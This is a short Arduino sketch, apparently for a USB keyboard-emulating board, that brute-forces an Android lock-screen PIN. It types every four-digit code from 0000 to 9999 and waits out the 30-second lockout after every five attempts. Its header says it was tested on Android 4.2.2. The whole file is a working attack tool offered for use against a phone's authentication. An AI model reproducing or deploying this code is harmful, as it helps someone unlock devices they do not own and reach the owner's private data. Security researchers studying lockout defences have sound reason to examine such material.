/* 

 Bruteforce Android Lock-Screen PIN
 
 Tested on Android 4.2.2 on Google Nexus Galaxy
 
 Note: default settings block 30s every 5 attempts

 ~ Guillermo Grande <guillermo@binario.org>
 
*/

int lock = 1;

void setup() {
    delay(2000);
}

void loop() {
    for(unsigned i=0; i<10000; ++i)
    {
        char pin[8];
        sprintf(pin, "%04i", i);
        Keyboard.println(pin);
        if (lock == 5) {
            delay(4000);
            Keyboard.println();
            delay(30000);
            lock = 0;
        }
        lock = lock + 1;
    }
}
